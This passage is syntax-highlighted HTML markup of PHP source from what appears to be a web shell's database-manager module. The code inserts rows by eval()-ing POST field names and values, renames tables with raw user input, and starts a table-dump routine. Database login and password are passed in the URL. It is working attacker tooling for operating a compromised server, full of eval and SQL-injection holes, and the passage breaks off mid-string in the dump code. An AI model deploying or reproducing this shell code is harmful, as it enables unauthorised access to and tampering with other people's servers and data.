<span class="s2">eval(&quot;</span><span class="nx">\</span><span class="err">$</span><span class="s2">&quot;.</span><span class="si">$matches3[1]</span><span class="s2">[</span><span class="si">$i</span><span class="s2">].&quot;</span> <span class="o">=</span> <span class="nx">\</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="nx">adds2</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$matches3</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">]])</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">;&quot;</span><span class="p">);</span>
<span class="nv">$total_str</span> <span class="o">.=</span> <span class="nv">$matches3</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;=&#39;&quot;</span><span class="o">.</span><span class="nx">adds2</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$matches3</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">]])</span><span class="o">.</span><span class="s2">&quot;&#39;,,&quot;</span><span class="p">;</span>
<span class="p">}</span>

<span class="nv">$total_str</span> <span class="o">=</span> <span class="s2">&quot;,,&quot;</span><span class="o">.</span><span class="nv">$total_str</span><span class="p">;</span>

<span class="nb">preg_match_all</span><span class="p">(</span><span class="s2">&quot;/,(.*?)=&#39;(.*?)&#39;,/i&quot;</span><span class="p">,</span><span class="nv">$total_str</span><span class="p">,</span><span class="nv">$matches4</span><span class="p">);</span>

<span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$matches4</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
        <span class="nv">$matches4</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;,&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$matches4</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]);</span>
        <span class="nv">$total_m_i</span> <span class="o">.=</span> <span class="s2">&quot;`&quot;</span><span class="o">.</span><span class="nv">$matches4</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;`,&quot;</span><span class="p">;</span>
        <span class="nv">$total_m_x</span> <span class="o">.=</span> <span class="s2">&quot;&#39;&quot;</span><span class="o">.</span><span class="nv">$matches4</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;,&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="nv">$total_m_i</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$total_m_i</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$total_m_i</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="nv">$total_m_x</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$total_m_x</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$total_m_x</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>

<span class="nv">$make_insert</span><span class="o">=</span><span class="s2">&quot;INSERT INTO `</span><span class="si">$tbl</span><span class="s2">` (</span><span class="si">$total_m_i</span><span class="s2">) VALUES (</span><span class="si">$total_m_x</span><span class="s2">)&quot;</span><span class="p">;</span>
<span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$make_insert</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&amp;lt;font color=red&amp;gt;&quot;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">);</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;b&amp;gt;PHP var:&amp;lt;br&amp;gt;&amp;lt;/b&amp;gt;</span><span class="se">\$</span><span class="s2">sql=</span><span class="se">\&quot;</span><span class="si">$make_insert\</span><span class="s2">&quot;</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">print &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">meta</span> <span class="nx">http</span><span class="o">-</span><span class="nx">equiv</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">5;URL=</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;vnutr=1&amp;baza=1&amp;vn=&quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;vn&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;db=</span><span class="si">$db</span><span class="s2">&amp;tbl=</span><span class="si">$tbl\</span><span class="s2">&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">}#end of insert</span>
<span class="s2">}#end of update</span>
<span class="s2">}</span>
<span class="s2"># end of edit row</span>


<span class="s2"># insert new line</span>
<span class="s2">if(</span><span class="si">$_GET[&#39;ins_new_line&#39;]</span><span class="s2">){</span>
<span class="si">$qn</span><span class="s2"> = mysql_query(&#39;SHOW FIELDS FROM &#39;.</span><span class="si">$tbl</span><span class="s2">) or die(&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">red</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;.mysql_error().&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">font</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;);</span>
<span class="s2">print &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">form</span> <span class="nx">method</span><span class="o">=</span><span class="nx">post</span> <span class="nx">action</span><span class="o">=</span><span class="s1">&#39;$php_self?p=sql&amp;login=&quot;.$_GET[&#39;</span><span class="nx">login</span><span class="s1">&#39;].&quot;&amp;pass=&quot;.$_GET[&#39;</span><span class="nx">pass</span><span class="s1">&#39;].&quot;&amp;adress=&quot;.$_GET[&#39;</span><span class="nx">adress</span><span class="s1">&#39;].&quot;&amp;conn=1&amp;baza=1&amp;tbl=&quot;.$_GET[&#39;</span><span class="nx">tbl</span><span class="s1">&#39;].&quot;&amp;vn=&quot;.$_GET[&#39;</span><span class="nx">vn</span><span class="s1">&#39;].&quot;&amp;db=&quot;.$_GET[&#39;</span><span class="nx">db</span><span class="s1">&#39;].&quot;&amp;ins_new_line=1&#39;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="nx">Insert</span> <span class="k">new</span> <span class="nx">line</span> <span class="nx">in</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$tbl</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nx">table</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">Br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">print &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">table</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">while (</span><span class="si">$new_line</span><span class="s2"> = mysql_fetch_array(</span><span class="si">$qn</span><span class="s2">, MYSQL_ASSOC)) {</span>
<span class="s2">foreach (</span><span class="si">$new_line</span><span class="s2"> as </span><span class="si">$key</span><span class="s2"> =&amp;gt;</span><span class="si">$next</span><span class="s2">) {</span>
<span class="si">$buff</span><span class="s2"> .= &quot;</span><span class="nv">$next</span> <span class="s2">&quot;;</span>
<span class="s2">}</span>
<span class="si">$expl</span><span class="s2">=explode(&quot;</span> <span class="s2">&quot;,</span><span class="si">$buff</span><span class="s2">);</span>
<span class="si">$buff2</span><span class="s2"> .= </span><span class="si">$expl[0]</span><span class="s2">.&quot;</span> <span class="s2">&quot;;</span>
<span class="s2">print &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">tr</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="nx">silver</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$expl</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">green</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;(</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$expl</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;)</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">font</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">textarea</span> <span class="nx">name</span><span class="o">=</span><span class="s1">&#39;$expl[0]&#39;</span> <span class="nx">cols</span><span class="o">=</span><span class="mi">39</span> <span class="nx">rows</span><span class="o">=</span><span class="mi">5</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">textarea</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">tr</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">unset(</span><span class="si">$buff</span><span class="s2">);</span>
<span class="s2">}</span>
<span class="s2">print &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">table</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">center</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="nx">submit</span> <span class="nx">value</span><span class="o">=</span><span class="nx">Insert</span> <span class="nx">name</span><span class="o">=</span><span class="nx">mk_ins</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">form</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">center</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">if(</span><span class="si">$_POST[&#39;mk_ins&#39;]</span><span class="s2">){</span>
<span class="s2">preg_match_all(&quot;</span><span class="o">/</span><span class="p">(</span><span class="o">.*?</span><span class="p">)</span><span class="nx">\s</span><span class="o">/</span><span class="nx">i</span><span class="s2">&quot;,</span><span class="si">$buff2</span><span class="s2">,</span><span class="si">$matches3</span><span class="s2">);</span>
<span class="s2">for(</span><span class="si">$i</span><span class="s2">=0; </span><span class="si">$i</span><span class="s2">&amp;lt;count(</span><span class="si">$matches3[0]</span><span class="s2">); </span><span class="si">$i</span><span class="s2">++){</span>
<span class="s2">eval(&quot;</span><span class="nx">\</span><span class="err">$</span><span class="s2">&quot;.</span><span class="si">$matches3[1]</span><span class="s2">[</span><span class="si">$i</span><span class="s2">].&quot;</span> <span class="o">=</span> <span class="nx">\</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="nx">adds2</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$matches3</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">]])</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">;&quot;</span><span class="p">);</span>
<span class="nv">$total_str</span> <span class="o">.=</span> <span class="nv">$matches3</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;=&#39;&quot;</span><span class="o">.</span><span class="nx">adds2</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$matches3</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">]])</span><span class="o">.</span><span class="s2">&quot;&#39;,,&quot;</span><span class="p">;</span>
<span class="p">}</span>

<span class="nv">$total_str</span> <span class="o">=</span> <span class="s2">&quot;,,&quot;</span><span class="o">.</span><span class="nv">$total_str</span><span class="p">;</span>
<span class="nb">preg_match_all</span><span class="p">(</span><span class="s2">&quot;/,(.*?)=&#39;(.*?)&#39;,/i&quot;</span><span class="p">,</span><span class="nv">$total_str</span><span class="p">,</span><span class="nv">$matches4</span><span class="p">);</span>

<span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$matches4</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
        <span class="nv">$matches4</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;,&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$matches4</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]);</span>
        <span class="nv">$total_m_i</span> <span class="o">.=</span> <span class="s2">&quot;`&quot;</span><span class="o">.</span><span class="nv">$matches4</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;`,&quot;</span><span class="p">;</span>
        <span class="nv">$total_m_x</span> <span class="o">.=</span> <span class="s2">&quot;&#39;&quot;</span><span class="o">.</span><span class="nv">$matches4</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;,&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="nv">$total_m_i</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$total_m_i</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$total_m_i</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="nv">$total_m_x</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$total_m_x</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$total_m_x</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>

<span class="nv">$make_insert</span><span class="o">=</span><span class="s2">&quot;INSERT INTO `</span><span class="si">$tbl</span><span class="s2">` (</span><span class="si">$total_m_i</span><span class="s2">) VALUES (</span><span class="si">$total_m_x</span><span class="s2">)&quot;</span><span class="p">;</span>
<span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$make_insert</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&amp;lt;font color=red&amp;gt;&quot;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">);</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;b&amp;gt;PHP var:&amp;lt;br&amp;gt;&amp;lt;/b&amp;gt;</span><span class="se">\$</span><span class="s2">sql=</span><span class="se">\&quot;</span><span class="si">$make_insert\</span><span class="s2">&quot;</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">print &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">meta</span> <span class="nx">http</span><span class="o">-</span><span class="nx">equiv</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">5;URL=</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;vnutr=1&amp;baza=1&amp;vn=&quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;vn&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;db=</span><span class="si">$db</span><span class="s2">&amp;tbl=</span><span class="si">$tbl\</span><span class="s2">&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">}#end of mk ins</span>
<span class="s2">}#end of ins new line</span>






<span class="s2">if(isset(</span><span class="si">$_GET[&#39;rename_table&#39;]</span><span class="s2">)){</span>
<span class="si">$rename_table</span><span class="s2">=</span><span class="si">$_GET[&#39;rename_table&#39;]</span><span class="s2">;</span>
<span class="s2">print &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Rename</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$rename_table</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nx">to</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">form</span> <span class="nx">method</span><span class="o">=</span><span class="nx">post</span> <span class="nx">action</span><span class="o">=</span><span class="s1">&#39;$php_self?p=sql&amp;login=$login&amp;pass=$pass&amp;adress=$adress&amp;conn=1&amp;db=$db&amp;baza=1&amp;rename_table=$rename_table&#39;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">name</span><span class="o">=</span><span class="nx">new_name</span> <span class="nx">size</span><span class="o">=</span><span class="mi">30</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">center</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="nx">submit</span> <span class="nx">value</span><span class="o">=</span><span class="nx">Rename</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">center</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">form</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="s2">&quot;;</span>

<span class="s2">if(isset(</span><span class="si">$_POST[&#39;new_name&#39;]</span><span class="s2">)){</span>
<span class="s2">mysql_select_db(</span><span class="si">$db</span><span class="s2">) or die(&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">red</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;.mysql_error().&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">font</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;);</span>
<span class="s2">mysql_query(&quot;</span><span class="nx">RENAME</span> <span class="nx">TABLE</span> <span class="nv">$rename_table</span> <span class="nx">TO</span> <span class="s2">&quot;.</span><span class="si">$_POST[&#39;new_name&#39;]</span><span class="s2">) or die(&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">red</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;.mysql_error().&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">font</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;);</span>
<span class="s2">print &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">green</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Table</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$rename_table</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nx">renamed</span> <span class="nx">to</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;.</span><span class="si">$_POST[&#39;new_name&#39;]</span><span class="s2">.&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">font</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">print &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">meta</span> <span class="nx">http</span><span class="o">-</span><span class="nx">equiv</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">2;URL=</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;baza=1&amp;db=</span><span class="si">$db\</span><span class="s2">&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">}</span>

<span class="s2">}#end of rename</span>


<span class="s2"># dump table</span>
<span class="s2">if(</span><span class="si">$_GET[&#39;dump&#39;]</span><span class="s2">){</span>
<span class="s2">if(!is_writable(</span><span class="si">$f_d</span><span class="s2">)){die(&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">red</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">This</span> <span class="nx">folder</span> <span class="nv">$f_d</span> <span class="nx">isnt</span> <span class="nx">writable</span><span class="o">!&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Cannot</span> <span class="nx">make</span> <span class="nx">dump</span><span class="o">.&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">green</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">You</span> <span class="nx">can</span> <span class="nx">change</span> <span class="nx">temp</span> <span class="nx">folder</span> <span class="k">for</span> <span class="nx">dump</span> <span class="nb">file</span> <span class="nx">in</span> <span class="nx">your</span> <span class="nx">browser</span><span class="o">!&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
